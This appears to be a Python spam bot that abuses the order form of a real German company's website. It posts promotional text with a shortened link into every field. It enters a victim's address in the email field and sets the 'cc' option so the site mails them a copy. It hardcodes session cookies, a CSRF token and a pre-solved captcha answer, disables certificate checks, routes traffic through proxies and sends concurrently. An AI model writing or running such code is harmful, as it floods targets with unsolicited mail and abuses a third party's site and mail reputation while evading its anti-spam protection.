import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        cookies = {
            'PHPSESSID': '94113567f61be3e7fcc204a6ef9fb0ba',
            'csrf_contao_csrf_token': '7mhweKvn_ZxIwITGNXxrZDTD2vFycFqDScLpyQdfXLc',
            'user_privacy_settings': '2',
        }
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            # Requests sorts cookies= alphabetically
            # 'Cookie': 'PHPSESSID=94113567f61be3e7fcc204a6ef9fb0ba; csrf_contao_csrf_token=7mhweKvn_ZxIwITGNXxrZDTD2vFycFqDScLpyQdfXLc; user_privacy_settings=2',
            'Origin': 'http://www.functional-design.de',
            'Referer': 'http://www.functional-design.de/offer-order/offer-order-form.html',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }
        data = {
            'FORM_SUBMIT': 'auto_form_63',
            'REQUEST_TOKEN': '7mhweKvn_ZxIwITGNXxrZDTD2vFycFqDScLpyQdfXLc',
            'name': text,
            'fon': text,
            'email': target,
            'strasse': text,
            'plz': text,
            'stadt': text,
            'lieferstrasse': text,
            'lieferstadt': text,
            'message': text,
            'bestellung_spoiler': text,
            'cc': [
                '',
                'cc',
            ],
            'captcha_851': '13',
            'captcha_851_hash': '0bb324ecd0d7039baf585b0e989cf7a4f8454767732d928dc3565e749a62c64c',
            'captcha_851_name': '',
        }

        response = requests.post('http://www.functional-design.de/offer-order/offer-order-form.html', cookies=cookies,
                                 headers=headers, data=data, verify=False, proxies=proxies)
        return response


if __name__ == '__main__':
    success_message = 'Thank you for your email!'
    project_name = 'functional'
    promo_link = 'bit.ly/3CEv81r'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
